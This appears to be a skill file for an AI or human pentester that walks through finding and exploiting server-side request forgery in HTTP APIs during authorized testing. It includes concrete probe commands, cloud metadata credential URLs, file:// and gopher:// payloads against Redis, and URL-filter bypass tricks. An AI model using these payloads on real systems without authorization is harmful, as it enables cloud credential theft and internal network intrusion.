---
name: api-ssrf
description: Find, confirm, and exploit Server-Side Request Forgery (API7:2023) in HTTP APIs — locate URL-consuming sinks (webhooks, import-from-URL, renderers, SSO *_uri params), prove the server fetches attacker URLs via out-of-band callbacks, pivot to cloud metadata (AWS/GCP/Azure) and internal hosts, defeat URL filters with encoding/redirect/rebinding bypasses, and record coverage and findings in rupu. Use during phase 5 of the api-testing flow, whenever an API accepts a URL, hostname, IP, or file reference.
license: Apache-2.0
metadata:
  author: Section9Labs
  version: "1.0.0"
---

# API SSRF (API7:2023) — Server-Side Request Forgery

Goal: make the API server issue requests to URLs you choose, then turn that into
impact — cloud metadata credentials, internal service access, internal port
mapping, local file reads. Every parse step ends in rupu-ingestible output:
work-unit JSON under `reports/`, `assets.mark` coverage, `findings.report`
findings. Wiring details: `references/rupu.md`.

## 1. Find the sinks

SSRF lives wherever the API takes a URL, hostname, IP, or file reference and
acts on it server-side. Full catalog with request shapes: `references/sinks.md`.
Prioritize:

- **Webhooks / callbacks** — `callback_url`, `webhook`, `notify_url`, event
  subscription endpoints, payment/IPN callbacks. Usually blind → OOB-first.
- **Import / fetch-by-URL** — "import from URL", avatar/image-from-URL, feed
  readers, link previews/unfurlers, document converters. Often echo fetched
  content → in-band readable SSRF.
- **Renderers** — HTML→PDF, screenshot, thumbnail services. The renderer loads
  `<img>`, `<iframe>`, `<link>`, `url()` — inject markup if you can't inject the
  URL directly.
- **SSO / OIDC / SAML** — `redirect_uri`, `jwks_uri`, `logout_uri`, dynamic
  client registration, OIDC discovery `issuer`/metadata URLs, SAML metadata
  import.
- **Proxy/gateway params** — `?url=`, `?dest=`, `?target=`, `?host=`,
  `?port=`, `?path=`, API gateway "upstream" config.
- **XML/SVG uploads** — XXE external entities and SVG `<image href>` are SSRF
  sinks even when no URL param exists.

Suspicious parameter names: `url uri callback dest redirect webhook target feed
host port path file src href link site domain proxy fetch endpoint next data
reference template preview`.

Hidden params — run arjun against each candidate endpoint:

```
arjun -u https://api.example.com/v1/preview -m GET -oJ reports/arjun-preview.json
arjun -u https://api.example.com/v1/orders -m JSON --include '{"token":"..."}' -oJ reports/arjun-orders.json
```

Inputs to triage come from the phase-1 inventory. To fan out per API resource,
import the reporting pack's **`work-units`** skill and split the spec —
`python3 <work-units>/scripts/split.py openapi reports/openapi.json` — then
grep each unit's operations for the parameter names above. Mark the service
and every candidate endpoint `mapped` with `assets.mark` (shapes in
`references/rupu.md`).

## 2. Stand up out-of-band detection

Blind SSRF (most webhooks) only proves itself by an inbound DNS/HTTP hit on
infrastructure you watch. Set this up **before** probing.

Preferred — interactsh:

```
interactsh-client -v -json -o reports/interactions.json
# self-hosted: interactsh-client -server https://oob.example.net -token <t> -v -json -o reports/interactions.json
```

Note the payload domain it prints (e.g. `c8ns...oast.example.net`). A unique
subdomain per probe correlates hit → payload. A **DNS-only** interaction still
proves the server resolved your hostname (SSRF exists; egress HTTP may be
filtered). An **HTTP** interaction gives you the server's `User-Agent`, source
IP, and any forwarded headers — capture them, they are evidence.

No external OOB available — run the bundled listener on a host the target can
reach (public IP or inside the environment):

```
python3 scripts/oob_listener.py --http-port 80 --dns-port 53 --a-record 203.0.113.10 --out reports/oob-hits.jsonl
```

It logs every HTTP request (method, path, headers, source) and answers/logs DNS
queries, one JSON object per line. Point payloads at
`http://<token>.oob.example.net/` (DNS delegated to the listener) or
`http://203.0.113.10:80/<token>`.

## 3. Probe each sink

Capture one working request per sink (valid auth, valid body), replace the
URL value with the marker `__SSRF__`, save as a raw HTTP template:

```
POST /v1/webhooks HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"name":"ops","url":"__SSRF__"}
```

Run the probe set:

```
python3 scripts/ssrf_probe.py --template reports/webhook.req --tls \
    --oob oob.example.net --out reports
```

It sends: a baseline fetchable URL, OOB payloads (unique token subdomain per
probe), internal targets (`127.0.0.1` and common ports, `localhost`, `[::1]`,
`0.0.0.0`, RFC1918), cloud metadata URLs (AWS/GCP/Azure), and the bypass set
(decimal/octal/hex IPs, `127.0.0.1.nip.io`, `@`-confusion, `file://`,
`dict://`, `gopher://`). For each variant it records status, length, time,
and body indicators, diffs against baseline, and writes:

- `reports/api-ssrf-probes.json` — full normalized results (every payload,
  token, status/length/time delta, matched indicators).
- `reports/api-ssrf-units.json` — work units for the interesting variants,
  ready for a rupu `for_each` fan-out or `dispatch` (see `references/rupu.md`).

Reading the output:

| Signal | Meaning | Next move |
|---|---|---|
| OOB hit on token `pNN` | **Confirmed SSRF** (blind at least) | match token→payload in probes.json, escalate (§4) |
| Body contains `ami-id`, `computeMetadata`, `root:x:` | **Readable SSRF, impact in hand** | pull credentials (§4) |
| Status/length differs 127.0.0.1 vs 10.255.255.1 | In-band oracle | port-scan internal (§4) |
| Time delta >3s on unroutable IP | Timing oracle | port/host scan by timing |
| Error echoes connection refused / resolved IP | Error oracle | enumerate via error text |
| All variants identical, no OOB | Likely validated/not fetched | try bypasses + markup injection, then move on |

After probing an endpoint, raise it to `tested` with `assets.mark` regardless
of result — that is the coverage record.

## 4. Confirm, escalate, prove impact

**Prove it's the server, not you.** The OOB hit's source IP must belong to the
target's infrastructure (not your own egress), and/or the `User-Agent` is a
server library (`Go-http-client`, `python-requests`, `Java/…`, `curl/…`,
headless Chrome for renderers). An open redirect only bounces *your browser* —
if the fetch of the internal URL happens client-side it is open-redirect, not
SSRF. Legitimate-fetch features (webhook testers) still count as SSRF when they
reach internal/metadata addresses they shouldn't.

**Cloud metadata** (full endpoint/header tables: `references/cloud-metadata.md`):

- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/`, then
  `.../iam/security-credentials/` to list the role, then
  `.../iam/security-credentials/<role>` for `AccessKeyId`/`SecretAccessKey`/
  `Token`. Readable SSRF returning these = critical. If only IMDSv2 is enabled
  (needs `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`
  then a `X-aws-ec2-metadata-token` header), a GET-only SSRF fails — report
  that IMDSv1 being enabled would be the breaking weakness, and test
  header-injection sinks that could do the PUT dance.
- GCP: `http://metadata.google.internal/computeMetadata/v1/` — requires
  `Metadata-Flavor: Google`. Need header control (gopher://, injected headers,
  or renderer fetch with custom headers). Token at
  `.../instance/service-accounts/default/token`.
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` —
  requires `Metadata: true`.

**Internal recon.** Use the in-band/timing oracle to sweep:
`http://127.0.0.1:{80,443,22,3306,5432,6379,8080,8500,9200,2375,11211}/`,
then `10.0.0.0/8` / `172.16.0.0/12` / `192.168.0.0/16` guided by hostnames
leaked in errors, certs, or metadata. Closed = fast refuse; open = different
status/length/time; filtered = timeout. `scripts/ssrf_probe.py --ports` and
`--extra-url` cover this; log the mapping as evidence.

**Scheme abuse** (if the client library allows): `file:///etc/passwd` (local
read), `dict://127.0.0.1:6379/info` (service banner),
`gopher://127.0.0.1:6379/_...` (raw TCP — Redis `CONFIG SET`/`SLAVEOF`, SMTP,
FastCGI). Gopher turns readable SSRF into RCE-adjacent primitives.

**Filter bypass** when the obvious payloads are blocked — full matrix in
`references/bypasses.md`: decimal `http://2130706433/`, octal
`http://0177.0.0.1/`, hex `http://0x7f000001/`, short `http://127.1/`, IPv6
`http://[::1]/` and `http://[::ffff:127.0.0.1]/`, `0.0.0.0`, wildcard DNS
`http://127.0.0.1.nip.io/`, `@`-confusion
`http://api.example.com@169.254.169.254/`, open-redirect chaining (allowed
host 302s to the internal target — validators check the first URL, the client
follows the redirect), DNS rebinding (TTL-0 flip after validation), scheme
swaps and uppercase/unicode tricks.

## 5. Record

- `assets.mark`: endpoint `tested` once probed; **`exploited` only on real
  impact** — an OOB callback proven server-side, metadata/internal content
  returned, credentials, or internal service interaction.
- `findings.report` under the `api` profile, pinned to the endpoint's
  `http_route`, with an `http_exchange` evidence block containing the exact
  triggering request and the response **plus** the listener/interactsh hit
  (source IP, UA, timestamp) for blind SSRF. Field/CVSS contract: import the
  reporting pack's **`finding-report`** skill. Scope `S:C`/changed when the
  SSRF reaches internal network authority or metadata (it almost always does).
- Severity anchors: metadata credentials → critical; readable internal SSRF →
  high; blind OOB-only → medium-high (egress + recon primitive); open redirect
  misfiled as SSRF → re-file as redirect finding, not SSRF.

Hand surviving leads to the next phase via `reports/api-ssrf-units.json`
(fan-out pattern in `references/rupu.md`).
